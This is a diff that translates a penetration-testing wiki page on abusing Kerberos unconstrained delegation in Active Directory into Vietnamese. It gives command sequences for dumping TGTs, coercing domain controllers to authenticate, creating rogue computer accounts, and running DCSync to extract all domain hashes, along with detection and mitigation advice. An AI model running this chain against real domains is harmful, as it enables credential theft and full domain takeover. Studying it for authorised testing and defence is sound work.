@@ -4,11 +4,11 @@
 
 ## Unconstrained delegation
 
-This a feature that a Domain Administrator can set to any **Computer** inside the domain. Then, anytime a **user logins** onto the Computer, a **copy of the TGT** of that user is going to be **sent inside the TGS** provided by the DC **and saved in memory in LSASS**. So, if you have Administrator privileges on the machine, you will be able to **dump the tickets and impersonate the users** on any machine.
+Đây là một tính năng mà Domain Administrator có thể bật cho bất kỳ **Computer** nào trong domain. Sau đó, mỗi khi **user đăng nhập** vào Computer đó, một **bản sao TGT** của user sẽ được **gửi bên trong TGS** do DC cung cấp **và lưu trong bộ nhớ LSASS**. Vì vậy, nếu có đặc quyền Administrator trên máy, bạn có thể **dump ticket và giả mạo danh tính của user** trên bất kỳ máy nào.
 
-So if a domain admin logins inside a Computer with "Unconstrained Delegation" feature activated, and you have local admin privileges inside that machine, you will be able to dump the ticket and impersonate the Domain Admin anywhere (domain privesc).
+Do đó, nếu Domain Admin đăng nhập vào một Computer đã bật tính năng "Unconstrained Delegation" và bạn có đặc quyền local admin trên máy đó, bạn có thể dump ticket và giả mạo danh tính của Domain Admin ở bất cứ đâu (domain privesc).
 
-You can **find Computer objects with this attribute** checking if the [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) attribute contains [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). You can do this with an LDAP filter of ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, which is what powerview does:
+Bạn có thể **tìm các đối tượng Computer có thuộc tính này** bằng cách kiểm tra xem thuộc tính [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) có chứa [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) hay không. Bạn có thể thực hiện việc này bằng bộ lọc LDAP ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, đây là cách powerview thực hiện:
 
 ```bash
 # List unconstrained computers
@@ -32,43 +32,43 @@ Rubeus.exe dump
 Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
 ```
 
-Load the ticket of Administrator (or victim user) in memory with **Mimikatz** or **Rubeus for a** [**Pass the Ticket**](pass-the-ticket.md)**.**\
-More info: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)<sup>[[2]](#references)</sup>\
-[**More information about Unconstrained delegation in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)<sup>[[2]](#references)[[3]](#references)</sup>
+Nạp ticket của Administrator (hoặc người dùng nạn nhân) vào bộ nhớ bằng **Mimikatz** hoặc **Rubeus để thực hiện** [**Pass the Ticket**](pass-the-ticket.md)**.**\
+Thông tin thêm: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)<sup>[[2]](#references)</sup>\
+[**Thông tin thêm về Unconstrained delegation trên ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)<sup>[[2]](#references)[[3]](#references)</sup>
 
-### **Force Authentication**
+### **Buộc xác thực**
 
-If an attacker is able to **compromise a computer allowed for "Unconstrained Delegation"**, he could **trick** a **Print server** to **automatically login** against it **saving a TGT** in the memory of the server.\
-Then, the attacker could perform a **Pass the Ticket attack to impersonate** the user Print server computer account.
+Nếu attacker có thể **xâm nhập một máy tính được phép sử dụng "Unconstrained Delegation"**, họ có thể **đánh lừa** một **Print server** để máy chủ này **tự động đăng nhập** vào máy tính đó, **lưu TGT** trong bộ nhớ của máy chủ.\
+Sau đó, attacker có thể thực hiện **tấn công Pass the Ticket để mạo danh** tài khoản máy tính của Print server.
 
-To make a print server login against any machine you can use [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
+Để khiến Print server đăng nhập vào bất kỳ máy nào, bạn có thể dùng [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
 
 ```bash
 .\SpoolSample.exe <printmachine> <unconstrinedmachine>
 ```
 
-If the TGT if from a domain controller, you could perform a [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) and obtain all the hashes from the DC.\
-[**More info about this attack in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)<sup>[[10]](#references)</sup>
+Nếu TGT đến từ một domain controller, bạn có thể thực hiện [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) và lấy tất cả hash từ DC.\
+[**Tìm hiểu thêm về attack này tại ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)<sup>[[10]](#references)</sup>
 
-Find here other ways to **force an authentication:**
+Tìm thêm các cách **buộc xác thực** tại đây:
 
 
 {{#ref}}
 printers-spooler-service-abuse.md
 {{#endref}}
 
-Any other coercion primitive that makes the victim authenticate with **Kerberos** to your unconstrained-delegation host works too. In modern environments this often means swapping the classic PrinterBug flow for **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN**, or **WebClient/WebDAV**-based coercion depending on which RPC surface is reachable.
+Bất kỳ primitive coercion nào khác khiến máy nạn nhân xác thực bằng **Kerberos** với host unconstrained-delegation của bạn cũng đều có hiệu quả. Trong các môi trường hiện đại, điều này thường có nghĩa là thay luồng PrinterBug cổ điển bằng **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN** hoặc coercion dựa trên **WebClient/WebDAV**, tùy thuộc vào bề mặt RPC nào có thể truy cập.
 
-### Abusing a user/service account with unconstrained delegation
+### Lạm dụng tài khoản người dùng/dịch vụ có unconstrained delegation
 
-Unconstrained delegation is **not limited to computer objects**. A **user/service account** can also be configured as `TRUSTED_FOR_DELEGATION`. In that scenario, the practical requirement is that the account must receive Kerberos service tickets for an **SPN it owns**.
+Unconstrained delegation **không chỉ giới hạn ở các computer object**. Một **tài khoản người dùng/dịch vụ** cũng có thể được cấu hình là `TRUSTED_FOR_DELEGATION`. Trong tình huống đó, yêu cầu thực tế là tài khoản phải nhận được các service ticket Kerberos cho một **SPN mà nó sở hữu**.
 
-This leads to 2 very common offensive paths:
+Điều này dẫn đến 2 hướng tấn công rất phổ biến:
 
-1. You compromise the password/hash of the unconstrained-delegation **user account**, then **add an SPN** to that same account.
-2. The account already has one or more SPNs, but one of them points to a **stale/decommissioned hostname**; recreating the missing **DNS A record** is enough to hijack the authentication flow without modifying the SPN set.<sup>[[8]](#references)</sup>
+1. Bạn chiếm được password/hash của **tài khoản người dùng** có unconstrained delegation, sau đó **thêm một SPN** vào chính tài khoản đó.
+2. Tài khoản đã có một hoặc nhiều SPN, nhưng một SPN trỏ đến **hostname cũ/đã ngừng hoạt động**; chỉ cần tạo lại **DNS A record** bị thiếu là đủ để chiếm quyền luồng xác thực mà không cần sửa tập SPN.<sup>[[8]](#references)</sup>
 
-Minimal Linux flow:
+Luồng Linux tối thiểu:
 
 ```bash
 # 1) Find unconstrained-delegation users and their SPNs
@@ -98,24 +98,24 @@ KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
 
 Notes:
 
-- This is especially useful when the unconstrained principal is a **service account** and you only have its credentials, not code execution on a joined host.
-- If the target user already has a **stale SPN**, recreating the corresponding **DNS record** may be less noisy than writing a new SPN into AD.
-- Recent Linux-centric tradecraft uses `addspn.py`, `dnstool.py`, `krbrelayx.py`, and one coercion primitive; you do not need to touch a Windows host to complete the chain.
+- Cách này đặc biệt hữu ích khi principal có unconstrained delegation là một **service account** và bạn chỉ có thông tin xác thực của nó, không có quyền thực thi code trên host đã join domain.
+- Nếu user mục tiêu đã có **SPN cũ**, tạo lại **DNS record** tương ứng có thể ít gây chú ý hơn so với việc ghi SPN mới vào AD.
+- Tradecraft gần đây tập trung vào Linux sử dụng `addspn.py`, `dnstool.py`, `krbrelayx.py` và một primitive coercion; bạn không cần truy cập bất kỳ host Windows nào để hoàn tất chuỗi này.
 
-### Abusing Unconstrained Delegation with an attacker-created computer
+### Lạm dụng Unconstrained Delegation bằng máy tính do kẻ tấn công tạo
 
-Modern domains often have `MachineAccountQuota > 0` (default 10), allowing any authenticated principal to create up to N computer objects. If you also hold the `SeEnableDelegationPrivilege` token privilege (or equivalent rights), you can set the newly created computer to be trusted for unconstrained delegation and harvest inbound TGTs from privileged systems.<sup>[[1]](#references)</sup>
+Các domain hiện đại thường có `MachineAccountQuota > 0` (mặc định là 10), cho phép mọi principal đã xác thực tạo tối đa N computer object. Nếu bạn cũng có token privilege `SeEnableDelegationPrivilege` (hoặc quyền tương đương), bạn có thể đặt máy tính vừa tạo ở trạng thái được tin cậy cho unconstrained delegation và thu thập TGT gửi đến từ các hệ thống có đặc quyền.<sup>[[1]](#references)</sup>
 
-High-level flow:
+Luồng tổng quan:
 
-1) Create a computer you control
+1) Tạo một máy tính do bạn kiểm soát
 
 ```bash
 # Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
 addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
 ```
 
-2) Make the fake hostname resolvable inside the domain
+2) Làm cho hostname giả có thể phân giải được bên trong miền
 
 ```bash
 # krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
@@ -124,7 +124,7 @@ python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
   -dns-ip <DC_IP> <DC_FQDN>
 ```
 
-3) Enable Unconstrained Delegation on the attacker-controlled computer
+3) Bật Unconstrained Delegation trên máy tính do attacker kiểm soát
 
 ```bash
 # Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
@@ -132,9 +132,9 @@ python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
 bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
 ```
 
-Why this works: with unconstrained delegation, the LSA on a delegation-enabled computer caches inbound TGTs. If you trick a DC or privileged server to authenticate to your fake host, its machine TGT will be stored and can be exported.
+Vì sao cách này hiệu quả: với unconstrained delegation, LSA trên máy tính được bật delegation sẽ lưu cache các TGT gửi đến. Nếu bạn lừa DC hoặc máy chủ có đặc quyền xác thực với host giả của mình, TGT của máy đó sẽ được lưu và có thể được xuất.
 
-4) Start krbrelayx in export mode and prepare the Kerberos material
+4) Khởi chạy krbrelayx ở chế độ export và chuẩn bị tài liệu Kerberos
 
 ```bash
 # Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
@@ -145,7 +145,7 @@ python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>
 python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
 ```
 
-5) Coerce authentication from the DC/servers to your fake host
+5) Ép DC/servers xác thực với fake host của bạn
 
 ```bash
 # netexec (CME fork) coerce_plus module supports multiple coercion vectors
@@ -153,14 +153,14 @@ python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SA
 netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
 ```
 
-krbrelayx will save ccache files when a machine authenticates, for example:
+krbrelayx sẽ lưu các tệp ccache khi một máy tính xác thực, ví dụ:
 
 ```
 Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
 Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
 ```
 
-6) Use the captured DC machine TGT to perform DCSync
+6) Sử dụng TGT của máy DC đã thu thập để thực hiện DCSync
 
 ```bash
 # Create a krb5.conf for the realm (netexec helper)
@@ -176,38 +176,37 @@ KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
   secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
 ```
 
-Notes and requirements:
+Ghi chú và yêu cầu:
 
-- `MachineAccountQuota > 0` enables unprivileged computer creation; otherwise you need explicit rights.
-- Setting `TRUSTED_FOR_DELEGATION` on a computer requires `SeEnableDelegationPrivilege` (or domain admin).
-- Ensure name resolution to your fake host (DNS A record) so the DC can reach it by FQDN.
-- Coercion requires a viable vector (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN, etc.). Disable these on DCs if possible.
-- If the victim account is marked as **"Account is sensitive and cannot be delegated"** or is a member of **Protected Users**, the forwarded TGT will not be included in the service ticket, so this chain won't yield a reusable TGT.<sup>[[9]](#references)</sup>
-- If **Credential Guard** is enabled on the authenticating client/server, Windows blocks **Kerberos unconstrained delegation**, which can make otherwise valid coercion paths fail from an operator perspective.
+- `MachineAccountQuota > 0` cho phép tạo máy tính mà không cần đặc quyền; nếu không, bạn cần có quyền cụ thể.
+- Để đặt `TRUSTED_FOR_DELEGATION` trên máy tính, cần có `SeEnableDelegationPrivilege` (hoặc quyền domain admin).
+- Đảm bảo phân giải tên trỏ đến fake host của bạn (bản ghi DNS A) để DC có thể kết nối đến host đó bằng FQDN.
+- Cần có vector khả thi để coercion hoạt động (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN, v.v.). Nếu có thể, hãy vô hiệu hóa các vector này trên DC.
+- Nếu tài khoản nạn nhân được đánh dấu **"Account is sensitive and cannot be delegated"** hoặc là thành viên của **Protected Users**, TGT được chuyển tiếp sẽ không được đưa vào service ticket, vì vậy chuỗi này sẽ không lấy được TGT có thể tái sử dụng.<sup>[[9]](#references)</sup>
+- Nếu **Credential Guard** được bật trên client/server xác thực, Windows sẽ chặn **Kerberos unconstrained delegation**; điều này có thể khiến các đường coercion vốn hợp lệ thất bại theo góc nhìn của operator.
 
-Detection and hardening ideas:
+Ý tưởng phát hiện và hardening:
 
-- Alert on Event ID 4741 (computer account created) and 4742/4738 (computer/user account changed) when UAC `TRUSTED_FOR_DELEGATION` is set.
-- Monitor for unusual DNS A-record additions in the domain zone.
-- Watch for spikes in 4768/4769 from unexpected hosts and DC-authentications to non-DC hosts.
-- Restrict `SeEnableDelegationPrivilege` to a minimal set, set `MachineAccountQuota=0` where feasible, and disable Print Spooler on DCs. Enforce LDAP signing and channel binding.
+- Cảnh báo khi có Event ID 4741 (tạo tài khoản máy tính) và 4742/4738 (thay đổi tài khoản máy tính/người dùng) nếu UAC `TRUSTED_FOR_DELEGATION` được đặt.
+- Giám sát các bản ghi DNS A được thêm bất thường trong zone của domain.
+- Theo dõi mức tăng đột biến của 4768/4769 từ các host không mong đợi và các lần xác thực của DC đến host không phải DC.
+- Giới hạn `SeEnableDelegationPrivilege` ở mức tối thiểu, đặt `MachineAccountQuota=0` nếu khả thi và vô hiệu hóa Print Spooler trên DC. Bắt buộc sử dụng LDAP signing và channel binding.
 
-### Mitigation
+### Giảm thiểu
 
-- Limit DA/Admin logins to specific services
-- Set "Account is sensitive and cannot be delegated" for privileged accounts.
+- Giới hạn các lần đăng nhập DA/Admin vào những service cụ thể
+- Đặt "Account is sensitive and cannot be delegated" cho các tài khoản có đặc quyền.
 
 ## References
 
-- [1] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
+- [1] [HTB: Delegate — Thông tin đăng nhập SYSVOL → Kerberoast có mục tiêu → Unconstrained Delegation → DCSync để lên DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
 - [2] [harmj0y – S4U2Pwnage](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
-- [3] [ired.team – Domain compromise via unrestricted delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
+- [3] [ired.team – Chiếm quyền domain thông qua unrestricted delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
 - [4] [krbrelayx](https://github.com/dirkjanm/krbrelayx)
 - [5] [Impacket addcomputer.py](https://github.com/fortra/impacket)
 - [6] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
-- [7] [netexec (CME fork)](https://github.com/Pennyw0rth/NetExec)
-- [8] [Praetorian – Unconstrained Delegation in Active Directory](https://www.praetorian.com/blog/unconstrained-delegation-active-directory/)
-- [9] [Microsoft Learn – Protected Users Security Group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
-- [10] [ired.team – Domain compromise via DC print server and Kerberos delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)
-
+- [7] [netexec (bản fork của CME)](https://github.com/Pennyw0rth/NetExec)
+- [8] [Praetorian – Unconstrained Delegation trong Active Directory](https://www.praetorian.com/blog/unconstrained-delegation-active-directory/)
+- [9] [Microsoft Learn – Nhóm bảo mật Protected Users](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
+- [10] [ired.team – Chiếm quyền domain thông qua print server của DC và Kerberos delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)
 {{#include ../../banners/hacktricks-training.md}}
